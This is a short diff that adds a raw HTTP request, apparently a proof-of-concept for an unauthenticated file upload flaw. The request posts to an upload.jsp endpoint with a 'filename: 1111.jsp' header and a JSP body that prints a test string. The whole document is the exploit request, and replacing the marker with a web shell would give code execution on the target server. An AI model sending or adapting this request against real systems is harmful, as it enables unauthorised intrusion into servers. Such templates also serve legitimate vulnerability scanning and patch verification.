@@ -1,0 +1,16 @@
+POST /linux/pages/upload.jsp HTTP/1.1
+Host: ip:port
+User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:52.0) Gecko/20100101 Firefox/52.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3
+Accept-Encoding: gzip, deflate
+Cookie: JSESSIONID=F0344BD3C6761D7E4CFDDD76960710B1.server; JSESSIONID=297190CC38DE8614285AD7DC95102AFB.server
+DNT: 1
+Connection: close
+Upgrade-Insecure-Requests: 1
+Content-Type: application/x-www-form-urlencoded
+filename: 1111.jsp
+Content-Length: 56
+
+
+<% out.println("111111");%>
